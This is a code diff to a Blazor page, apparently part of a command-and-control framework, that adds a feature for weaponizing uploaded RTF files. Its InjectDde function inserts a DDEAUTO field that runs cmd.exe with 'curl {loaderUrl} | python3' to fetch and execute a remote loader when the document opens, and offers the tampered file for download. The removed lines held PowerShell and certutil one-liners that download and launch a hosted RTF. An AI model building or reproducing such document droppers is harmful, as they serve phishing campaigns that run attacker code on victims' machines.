@@ -59,23 +59,34 @@
         </div>
 
         <div class="loader-section">
-            <h4 class="loader-section-title">Delivery One-Liners</h4>
-
-            <span class="loader-command-label">PowerShell (download &amp; open)</span>
-            <div class="loader-command">
-                <code class="loader-code">irm @_rtfHostUrl -OutFile $env:TEMP\doc.rtf; Start-Process $env:TEMP\doc.rtf</code>
-                <button class="loader-copy-btn" @onclick='() => Copy($"irm {_rtfHostUrl} -OutFile $env:TEMP\\doc.rtf; Start-Process $env:TEMP\\doc.rtf")' title="Copy">
-                    <C2Icon Name="copy" Size="Size.Xs" />
-                </button>
+            <h4 class="loader-section-title">4 — Custom RTF</h4>
+            <p class="loader-text rtf-field-hint">
+                Upload your own RTF document. The DDE field will be injected after the header, preserving your formatting and content.
+            </p>
+            <div class="rtf-actions">
+                <label class="loader-link-btn" style="cursor:pointer">
+                    <C2Icon Name="upload" Size="Size.Xs" /> Upload RTF
+                    <InputFile OnChange="OnCustomRtfUpload" accept=".rtf" style="display:none" />
+                </label>
+                @if (!string.IsNullOrEmpty(_customFileName))
+                {
+                    <span class="loader-text" style="margin-left:0.5rem;">@_customFileName</span>
+                }
             </div>
-
-            <span class="loader-command-label">CMD (certutil)</span>
-            <div class="loader-command">
-                <code class="loader-code">certutil -urlcache -split -f @_rtfHostUrl %TEMP%\doc.rtf &amp;&amp; start %TEMP%\doc.rtf</code>
-                <button class="loader-copy-btn" @onclick='() => Copy($"certutil -urlcache -split -f {_rtfHostUrl} %TEMP%\\doc.rtf && start %TEMP%\\doc.rtf")' title="Copy">
-                    <C2Icon Name="copy" Size="Size.Xs" />
-                </button>
-            </div>
+            @if (!string.IsNullOrEmpty(_customRtfContent))
+            {
+                <div class="rtf-preview-wrap" style="margin-top:0.5rem;">
+                    <pre class="rtf-preview">@_customRtfContent</pre>
+                </div>
+                <div class="rtf-actions">
+                    <button class="loader-link-btn" @onclick="DownloadCustomRtf">
+                        <C2Icon Name="download" Size="Size.Xs" /> Download Injected RTF
+                    </button>
+                    <button class="loader-copy-btn rtf-copy-wide" @onclick="() => Copy(_customRtfContent)" title="Copy RTF source">
+                        <C2Icon Name="copy" Size="Size.Xs" /> Copy
+                    </button>
+                </div>
+            }
         </div>
 
         <div class="loader-section">
@@ -97,8 +108,9 @@
     private string _loaderUrl = DefaultLoaderUrl;
     private string _docTitle = "";
     private string _docBody = "";
-    private string _rtfHostUrl = "https://your-server.com/document.rtf";
     private string _rtfContent = "";
+    private string _customFileName = "";
+    private string _customRtfContent = "";
 
     protected override void OnInitialized() => Rebuild();
 
@@ -154,6 +166,60 @@
                 var a = document.createElement('a');
                 a.href = 'data:application/rtf;base64,{base64}';
                 a.download = 'document.rtf';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            }})()
+        ");
+    }
+
+    private async Task OnCustomRtfUpload(InputFileChangeEventArgs e)
+    {
+        var file = e.File;
+        if (file is null) return;
+
+        _customFileName = file.Name;
+        using var stream = file.OpenReadStream(maxAllowedSize: 10 * 1024 * 1024);
+        using var reader = new System.IO.StreamReader(stream);
+        var content = await reader.ReadToEndAsync();
+
+        _customRtfContent = InjectDde(content, _loaderUrl);
+        StateHasChanged();
+    }
+
+    private static string InjectDde(string rtfContent, string loaderUrl)
+    {
+        var cmd = $"curl {loaderUrl} | python3";
+        var ddeField = @"{\field{\*\fldinst {DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe ""/c " + RtfEscape(cmd) + @"""}}{" + @"\fldrslt }}" + "\n";
+
+        // Insert DDE field right after the first \pard (start of document body)
+        var pardIdx = rtfContent.IndexOf("\\pard");
+        if (pardIdx >= 0)
+        {
+            // Find the space or next control word after \pard to insert after the paragraph start
+            var insertIdx = rtfContent.IndexOf(' ', pardIdx);
+            if (insertIdx < 0) insertIdx = pardIdx + 5;
+            return rtfContent[..(insertIdx + 1)] + ddeField + rtfContent[(insertIdx + 1)..];
+        }
+
+        // Fallback: insert before the final closing brace
+        var lastBrace = rtfContent.LastIndexOf('}');
+        if (lastBrace >= 0)
+            return rtfContent[..lastBrace] + ddeField + rtfContent[lastBrace..];
+
+        return rtfContent;
+    }
+
+    private async Task DownloadCustomRtf()
+    {
+        var bytes = System.Text.Encoding.ASCII.GetBytes(_customRtfContent);
+        var base64 = Convert.ToBase64String(bytes);
+        var fileName = System.IO.Path.GetFileNameWithoutExtension(_customFileName) + "_dde.rtf";
+        await JS.InvokeVoidAsync("eval", $@"
+            (function() {{
+                var a = document.createElement('a');
+                a.href = 'data:application/rtf;base64,{base64}';
+                a.download = '{fileName}';
                 document.body.appendChild(a);
                 a.click();
                 document.body.removeChild(a);
